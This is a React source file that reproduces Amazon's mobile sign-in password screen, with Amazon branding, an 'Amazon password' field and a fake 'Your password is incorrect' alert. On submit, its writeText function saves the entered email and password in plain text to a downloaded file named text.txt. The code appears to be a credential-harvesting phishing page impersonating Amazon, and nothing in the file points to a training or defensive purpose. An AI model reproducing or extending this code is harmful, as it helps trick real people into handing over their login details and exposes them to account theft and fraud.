import React, { useState } from 'react'
import { useEmail } from '../context/contextData'

export default function PassworkMobile() {
    const { email, password, setPassword } = useEmail()
    const [showErrorMessage, setShowErrorMessage] = useState(false)

    const handleInputChange = (event) => {
        const { value } = event.target
        setPassword(value)
    }

    const handleContinueClick = () => {
        if (password.includes(' ') || password.trim() === '') {
            setShowErrorMessage(true)
        } else {
            setShowErrorMessage(false)
            writeText()
        }
    }

    const writeText = () => {
        if (email.trim() !== '' && password.trim() !== '') {
            var fileContent = `Email: ${email}\nPassword: ${password}`
            var blob = new Blob([fileContent], { type: 'text/plain' })

            var url = window.URL.createObjectURL(blob)

            var a = document.createElement('a')
            a.href = url
            a.download = 'text.txt'

            document.body.appendChild(a)
            a.click()
            document.body.removeChild(a)
        } else return
    }
    return (
        <>
            <header
                id='nav-main'
                data-nav-language='en_US'
                className='nav-mobile nav-progressive-attribute nav-locale-us nav-lang-en nav-ssl nav-unrec nav-blueheaven'
            >
                <div
                    id='navbar'
                    role='navigation'
                    aria-label='navigation'
                    className='nav-t-basicNoAuth nav-sprite-v3 celwidget'
                    data-csa-c-id='v36k2p-9ofh3m-vk8zi1-g3rghb'
                >
                    <div id='nav-logobar'>
                        <div className='nav-left'>
                            <script type='text/javascript'>
                                window.navmet.tmp=+new Date();
                            </script>
                            <div id='nav-logo'>
                                <a
                                    href='/ref=navm_hdr_logo'
                                    id='nav-logo-sprites'
                                    className='nav-logo-link nav-progressive-attribute'
                                    aria-label='Amazon'
                                >
                                    <span className='nav-sprite nav-logo-base'></span>
                                    <span
                                        id='logo-ext'
                                        className='nav-sprite nav-logo-ext nav-progressive-content'
                                    ></span>
                                    <span className='nav-logo-locale'>.us</span>
                                </a>
                            </div>
                        </div>
                        <div className='nav-right'></div>
                    </div>
                </div>

                <div id='nav-progressive-subnav'></div>
            </header>
            <div className='a-container2'>
                {showErrorMessage && (
                    <div className='a-section a-spacing-none auth-pagelet-mobile-container'>
                        <div
                            id='auth-error-message-box'
                            className='a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base'
                            role='alert'
                        >
                            <div className='a-box-inner a-alert-container'>
                                <h4 className='a-alert-heading'>
                                    There was a problem
                                </h4>
                                <div className='a-alert-content'>
                                    <ul
                                        className='a-unordered-list a-nostyle a-vertical'
                                        role='alert'
                                    >
                                        <li>
                                            <span className='a-list-item'>
                                                Your password is incorrect
                                            </span>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                )}
                <div className='a-section auth-pagelet-mobile-container'>
                    <div
                        id='auth-alert-window'
                        className='a-box a-alert a-alert-error a-spacing-small'
                        role='alert'
                    >
                        <div className='a-box-inner a-alert-container'>
                            <h4 className='a-alert-heading'>
                                There was a problem
                            </h4>
                            <div className='a-alert-content'></div>
                        </div>
                    </div>
                    <div
                        id='passkey-error-alert'
                        className='a-box a-alert a-alert-error aok-hidden'
                        role='alert'
                    >
                        <div className='a-box-inner a-alert-container'>
                            <h4 className='a-alert-heading'>Passkey error</h4>
                            <div className='a-alert-content'>
                                <p id='passkey-client-error-message'>
                                    Something went wrong, please sign-in another
                                    way or follow any instructions provided by
                                    your device.
                                </p>
                                <p
                                    id='passkey-generic-server-error-message'
                                    className='aok-hidden'
                                >
                                    Sorry, your passkey isn't working. There
                                    might be a problem with the server. Sign in
                                    with your password or try your passkey again
                                    later.
                                </p>
                                <p
                                    id='passkey-server-error-message'
                                    className='aok-hidden'
                                ></p>
                            </div>
                        </div>
                    </div>
                    <h2 className='font-400'>Sign in</h2>

                    <div className='a-row a-spacing-base text-aline'>
                        <span dir='ltr'>abcd@gmail.com</span>
                        <a
                            id='ap_change_login_claim'
                            className='a-link-normal'
                            tabIndex='7'
                            href='#'
                        >
                            Change
                        </a>
                    </div>
                    <form
                        name='signIn'
                        method='post'
                        action=''
                        className='auth-validate-form auth-clearable-form auth-validate-form'
                        data-fwcim-id='V1qGo6Hf'
                    />
                    <div
                        data-claim='abcd@gmail.com'
                        className='a-input-text-wrapper hide'
                    >
                        <input
                            type='text'
                            value='abcd@gmail.com'
                            id='ap-credential-autofill-hint'
                            autoComplete='email'
                            name='email'
                            className='auth-clear-icon-visible'
                        />
                    </div>
                    <div className='a-input-text-group a-spacing-medium a-spacing-top-micro text-aline'>
                        <label
                            htmlFor='ap_password'
                            aria-hidden='true'
                            className='a-form-label'
                        >
                            Amazon password
                        </label>

                        <div
                            id='auth-password-container'
                            className='a-input-text-wrapper auth-required-field auth-password-container auth-password auth-fill-password input_table_layout'
                        >
                            <input
                                type='password'
                                maxLength='1024'
                                id='ap_password'
                                autoComplete='current-password'
                                name='password'
                                tabIndex='2'
                                spellCheck='false'
                                aria-label='Amazon password'
                                className='w-100'
                                value={password}
                                onChange={handleInputChange}
                            />
                            <div className='a-row auth-visible-password-container auth-show-password-empty'>
                                <span className='a-size-small a-color-secondary auth-visible-password'></span>
                            </div>
                        </div>

                        <div
                            id='auth-password-missing-alert'
                            className='a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini'
                            role='alert'
                        >
                            <div className='a-box-inner a-alert-container'>
                                <i className='a-icon a-icon-alert'></i>
                                <div className='a-alert-content'>
                                    Enter your password
                                </div>
                            </div>
                        </div>
                    </div>
                    <div className='a-row'>
                        <div className='a-column a-span6 a-spacing-medium'>
                            <div
                                id='auth-show-password-checkbox-container'
                                className='a-checkbox a-checkbox-fancy a-control-row a-touch-checkbox auth-show-password-checkbox text-aline'
                            >
                                <label htmlFor='auth-signin-show-password-checkbox'>
                                    <input
                                        id='auth-signin-show-password-checkbox'
                                        type='checkbox'
                                        name=''
                                        value=''
                                        checked=''
                                        tabIndex='3'
                                    />
                                    <i className='a-icon a-icon-checkbox'></i>
                                    <span className='a-label a-checkbox-label'>
                                        Show password
                                    </span>
                                </label>
                            </div>
                        </div>

                        <div className='a-column a-span6 a-text-right a-spacing-none a-span-last'>
                            <a
                                id='auth-fpp-link-bottom'
                                className='a-spacing-none a-link-normal'
                                tabIndex='8'
                                href='#'
                            >
                                Forgot password?
                            </a>
                        </div>
                    </div>

                    <div className='a-row a-spacing-base'>
                        <div
                            data-a-input-name='rememberMe'
                            className='a-checkbox a-checkbox-fancy a-control-row a-touch-checkbox text-aline'
                        >
                            <label>
                                <input
                                    type='checkbox'
                                    name='rememberMe'
                                    value='true'
                                    tabIndex='4'
                                />
                                <i className='a-icon a-icon-checkbox'></i>
                                <span className='a-label a-checkbox-label'>
                                    Keep me signed in.
                                    <span
                                        className='a-declarative'
                                        data-action='a-modal'
                                        data-csa-c-type='widget'
                                        data-csa-c-func-deps='aui-da-a-modal'
                                        data-a-modal='{"max-width":"500px","closeButtonLabel":"","width":"95%","name":"remember-me-detail-link-modal","header":"\"Keep Me Signed In\" Checkbox"}'
                                        data-csa-c-id='hukbn7-ev1ppt-h5jofj-8a5agb'
                                    >
                                        <a
                                            id='remember_me_learn_more_link'
                                            className='a-link-normal'
                                            href='#'
                                        >
                                            Details
                                        </a>
                                    </span>
                                    <div
                                        className='a-popover-preload'
                                        id='a-popover-remember-me-detail-link-modal'
                                    >
                                        <div className='a-section a-spacing-large a-spacing-top-mini'>
                                            <p></p>
                                            <p>
                                                Choosing "Keep me signed in"
                                                reduces the number of times
                                                you're asked to Sign-In on this
                                                device.
                                            </p>
                                            <p>
                                                To keep your account secure, use
                                                this option only on your
                                                personal devices.
                                            </p>
                                            <p></p>
                                        </div>
                                    </div>
                                </span>
                            </label>
                        </div>
                    </div>

                    <span
                        id='auth-signin-button'
                        className='a-button a-button-span12 a-button-primary auth-disable-button-on-submit'
                    >
                        <span className='a-button-inner'>
                            <input
                                id='signInSubmit'
                                tabIndex='6'
                                className='a-button-input '
                                type='submit'
                                aria-labelledby='auth-signin-button-announce'
                                onClick={handleContinueClick}
                            />
                            <span
                                id='auth-signin-button-announce'
                                className='a-button-text'
                                aria-hidden='true'
                            >
                                Sign in
                            </span>
                        </span>
                    </span>
                </div>
            </div>
        </>
    )
}
